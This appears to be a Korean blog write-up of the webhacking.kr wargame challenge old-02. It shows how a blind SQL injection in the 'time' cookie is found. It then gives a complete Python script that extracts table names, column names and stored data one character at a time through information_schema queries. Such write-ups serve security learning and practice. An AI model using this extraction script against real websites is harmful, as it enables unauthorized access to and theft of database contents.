---
title: "[webhacking.kr] old-02"
slug: old02
published: 2026-11-09
draft: false
description: "old02 write up "
categoryId: webhacking-kr
lang: ko
---
1. 문제 개요

플랫폼 : [webhacking.kr](http://webhacking.kr)

난이도 : score 50

핵심 주제 : blind sql injection 



2. 문제 분석

문제에 들어가면 Restricted area라는 문구를 확인할 수 있다. 페이시 소스에 들어간다. 

```html
<!--
2026-11-09 01:04:05
-->
<h2>Restricted area</h2>Hello stranger. Your IP is logging...<!-- if you access admin.php i will kick your ass -->
```

페이지 소스에서는 시간이 찍혀있는 것을 볼 수 있고 admin.php 라는 페이지가 있음을 확인할 수 있다. 

```php
<form method=post>
type your secret password <input name=pw> <input type=submit>
```

pass 를 입력하는 form 이 있음을 확인할 수 있다. 다른 단서는 존재하지 않는다. 

여기서 추측 가능한 것은 pw를 입력하는 폼이 있으니 sqli 주제라는 것이다. 다음은 쿠키에서 단서를 찾아보자. 

![](/images/wehacking-kr/old-02/mw8s6d5o-gslboct1.png)

time 이라는 쿠키가 처음 페이지 소스의 시간 정보에 영향을 미치는 것을 추측. time 값을 바꿔보자. 

**time이 1일 때는 2070-01-01 09:00:01** 

**time이 0일 때는  2070-01-01 09:00:00 이다.** 

판별식이 작동하는지도 확인해 보았다.

(1=1) 은 09:00:01, (1=0) 은 09:00:00 이었다. 

time 값을 조종해 blind sqli 가 가능한지 테스트하기 위해 쿼리를 넣어본다. 

**(SELECT 1) 은 09:00:01 , (SELECT 200) 은 09:03:20 이다. 쿼리 반환값이 분과 초로 나타남을 알 수 있다.** 

이를 통해 blind sqli를 진행한다.



3. 풀이 과정

먼저 DB에 대한 정보를 파악해야 한다. information_schema.tables 테이블은 mysql에서 데이터베이스 메타데이터를 조회하는 시스템 뷰이다. 

- `information_schema`: 데이터베이스의 구조 정보를 제공하는 시스템 스키마
- `tables`: 데이터베이스에 존재하는 테이블과 뷰의 정보를 담고 있는 시스템 뷰
- `information_schema.tables`: `information_schema`에 속한 `tables`를 지정하는 정규화된 이름

**다음은 전체 풀이 과정과  exploit 코드이다.**

`time` 쿠키에 SQL 표현식을 삽입했을 때, 해당 표현식의 평가 결과가 HTML 응답에 표시되는 시간에 반영되는 것을 확인하였다.

이를 이용하면 SQL 쿼리의 실행 결과를 직접 조회하지 않고도, 응답에 나타나는 시간 값을 분석하여 정수 형태의 정보를 추출할 수 있다.

반복적인 요청을 자동화하기 위해 Python의 `requests` 라이브러리를 사용하였으며, 데이터 추출은 다음과 같은 순서로 진행하였다.

**① 테이블 개수 확인**

현재 데이터베이스에 존재하는 테이블의 개수를 확인하기 위해 `information_schema.tables`를 조회하였다.

`COUNT()` 함수를 이용하여 테이블 개수를 계산하고, `WHERE table_schema=database()` 조건을 통해 현재 데이터베이스에 속한 테이블만 조회하도록 제한하였다.

**② 테이블 이름 추출**

테이블 개수를 확인한 후, 각 테이블의 이름을 추출하였다.

먼저 `LENGTH()` 함수로 테이블 이름의 길이를 확인하였다. 이후 `SUBSTR()` 함수로 문자열을 한 글자씩 분리하고, `ASCII()` 함수를 이용하여 각 문자를 숫자로 변환하였다.

서버 응답에서 얻은 값을 다시 문자로 변환하여 테이블 이름을 복원하였다.

**③ 컬럼 개수 및 이름 추출**

테이블 이름을 확보한 후에는 `information_schema.columns`를 조회하여 각 테이블의 컬럼 정보를 확인하였다.

`COUNT()` 함수로 컬럼 개수를 계산한 뒤, 테이블 이름을 추출할 때와 동일하게 `LENGTH()`, `SUBSTR()`, `ASCII()` 함수를 활용하여 컬럼 이름을 복원하였다.

**④ 테이블 데이터 추출**

테이블과 컬럼 구조를 파악한 후 실제 저장된 데이터를 추출하였다.

먼저 `COUNT(*)`로 테이블의 행 개수를 확인하였다. 이후 각 행의 컬럼 값을 대상으로 `LENGTH()`를 이용해 데이터 길이를 구하고, `ASCII(SUBSTR())`를 반복하여 데이터를 한 문자씩 복원하였다.

**⑤ 추출 결과 확인**

위 과정을 Python으로 자동화하여 데이터베이스의 테이블 및 컬럼 구조와 실제 저장된 데이터를 순차적으로 확인하였다.

이를 통해 `time` 쿠키에서 발생하는 SQL Injection을 이용해 서버 응답에 반영되는 정수 값을 기반으로 데이터베이스 정보를 추론할 수 있음을 확인하였다.

```python 
import requests
import re

def total_time(sample_html):
    match = re.search(r"2070-01-01 09:(\d{2}):(\d{2})", sample_html)
    if match:
        minutes = int(match.group(1))
        seconds = int(match.group(2))
    else:
        print("error occured")

    return (minutes * 60) + seconds

def set_cookies(sql):
    
    my_cookies = { 
    "PHPSESSID" : "2bpgjcg8phg1koupjcobn32cbc",
    "time" : sql
    }   
    return my_cookies

url = "https://webhacking.kr/challenge/web-02/"
table_number = 0
table_word_number = 0
table_name = ""
column_number = 0 
column_name = ""

# 1. DB 속 테이블 개수 확인
sql = "(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())"

my_cookies = set_cookies(sql)

res = requests.get(url, cookies=my_cookies)
sample_html = res.text
table_number = total_time(sample_html)
print(f"테이블 개수 : {table_number}")


# 2. 첫 번째 테이블 이름의 글자 수 확인 (두 번째 테이블 길이를 보고 싶으면 LIMIT 1, 1로 바꾸면 됨)
for i in range(table_number):
    print("===============================================")
    sql = f"(SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT {i}, 1)"
    
    my_cookies = set_cookies(sql)
    res = requests.get(url, cookies=my_cookies)
    sample_html = res.text
    table_word_number = total_time(sample_html)
    print(f"{i+1}번 테이블 이름 길이 : {table_word_number}")

    # 3. 테이블 글자 추출
    table_name = ""
    column_name = ""

    for j in range(table_word_number):
        sql = f"(SELECT ASCII(SUBSTR(table_name, {j+1}, 1)) FROM information_schema.tables WHERE table_schema=database() LIMIT {i}, 1)"
        
        my_cookies = set_cookies(sql)
        res = requests.get(url, cookies=my_cookies)
        sample_html = res.text
        table_name += chr(total_time(sample_html))
        
    print(f"{i+1}번 테이블 이름 : {table_name}")

    # 4. 테이블 컬럼 추출
    # 4-1. 테이블 컬럼 개수 추출
    sql = f"(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name = '{table_name}' LIMIT 0, 1)"
    my_cookies = set_cookies(sql)
    res = requests.get(url, cookies=my_cookies)
    sample_html = res.text
    column_number = total_time(sample_html)
    print(f"{i+1}번 테이블 컬럼 개수 : {column_number}")

    # 4-2. 컬럼 길이 추출 
    for k in range(column_number):
        column_name = ""
        sql = f"(SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name = '{table_name}' LIMIT {k}, 1)"

        my_cookies = set_cookies(sql)
        res = requests.get(url, cookies=my_cookies)
        sample_html = res.text
        column_name_length = total_time(sample_html)

        # 4-3. 컬럼 글자 추출
        for l in range(column_name_length):
            sql = f"(SELECT ASCII(SUBSTR(column_name, {l+1}, 1)) FROM information_schema.columns WHERE table_name = '{table_name}' LIMIT {k}, 1)"
            my_cookies = set_cookies(sql)
            res = requests.get(url, cookies=my_cookies)
            sample_html = res.text
            column_name += chr(total_time(sample_html))
        
        print(f"{i+1}번 컬럼 이름 : {column_name}")

        # 5. 데이터 뽑기 
        # 5-1. 행 개수 추출
        sql = f"(SELECT COUNT(*) FROM {table_name})"

        res = requests.get(url, cookies=set_cookies(sql))
        row_number = total_time(res.text)
        print(f"{i+1}번 테이블 행 개수 : {row_number}")

        for n in range(row_number):
            sql = f"(SELECT LENGTH({column_name}) FROM {table_name} LIMIT {n}, 1)"    
            
            my_cookies = set_cookies(sql)
            res = requests.get(url, cookies=my_cookies)
            sample_html = res.text
            data_length = total_time(sample_html)

            # 5-2. 문자 추출
            data = ""

            for m in range(data_length):
                sql = f"(SELECT ASCII(SUBSTR({column_name}, {m+1}, 1)) FROM {table_name} LIMIT {n}, 1)"

                my_cookies = set_cookies(sql)
                res = requests.get(url, cookies=my_cookies)
                sample_html = res.text
                data += chr(total_time(sample_html))
                print(f"[+] 데이터 추출 중 : {data}", end="\r")
            print(f"{n+1}번 행 데이터 : {data}", end="")
            print("\n")
```

 



&nbsp;